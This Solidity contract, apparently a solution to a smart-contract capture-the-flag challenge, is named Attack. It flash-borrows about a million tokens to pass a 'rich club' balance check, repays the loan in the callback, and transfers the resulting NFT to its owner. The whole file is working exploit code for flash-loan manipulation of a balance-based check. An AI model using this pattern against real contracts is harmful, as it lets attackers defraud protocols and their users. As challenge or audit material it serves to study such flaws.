// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IClub {
    function iDeclareBeingRich() external;
}

interface IPool {
    function flashloan(address borrower, uint256 amount) external;
}

contract Attack is Ownable {
    // The address of the bank token
    address public bankToken;
    // The address of the pool
    address public pool;
    // The address of the club
    address public club;

    constructor(address _token, address _pool, address _club) {
        // Set the addresses of the bank token, pool, and club
        bankToken = _token;
        pool = _pool;
        club = _club;
    }

    // Attack the club with flashloaning from pool
    function attack() external onlyOwner {
        // Call the flashloan function of the pool contract with this contract's address and 1000001 bank tokens
        IPool(pool).flashloan(address(this), 1000001e18);
    }

    // Execute with money
    function executeWithMoney(uint256 amount) external {
        // Call to engage the rich club in the club contract
        IClub(club).iDeclareBeingRich();
        // Transfer the specified amount of bank tokens to the pool contract
        IERC20(bankToken).transfer(pool, amount);
    }

    // Transfer NFT to myself
    function transferNFT(uint256 tokenId) external onlyOwner {
        IERC721(club).safeTransferFrom(address(this), msg.sender, tokenId);
    }
}
